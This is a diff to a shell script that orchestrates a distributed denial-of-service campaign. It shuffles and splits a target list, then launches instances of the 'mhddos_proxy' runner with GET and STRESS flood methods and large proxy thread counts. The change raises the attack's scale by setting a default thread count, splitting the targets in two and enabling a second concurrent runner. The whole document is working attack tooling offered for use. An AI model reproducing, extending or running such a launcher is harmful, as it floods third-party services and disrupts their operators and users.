@@ -33,9 +33,9 @@ if [[ $docker_mode != "true" ]]; then
     proxy_finder="on"
 fi
 
-# if [[ $t_set_manual != "on" ]]; then
-#     export threads="-t 500"
-# fi
+if [[ $t_set_manual != "on" ]]; then
+    export threads="-t 250"
+fi
 export proxy_threads="2000"
 export methods="--http-methods GET STRESS"
 #rpc="--rpc 2000"
@@ -71,7 +71,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets by line in N files
 cd /var/tmp/
-split -n l/1 --additional-suffix=.uaripper $targets_uniq
+split -n l/2 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -200,8 +200,8 @@ while true; do
 echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $methods&
-        # sleep 10 # to decrease load on cpu during simultaneous start
-        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $methods&
+        sleep 10 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
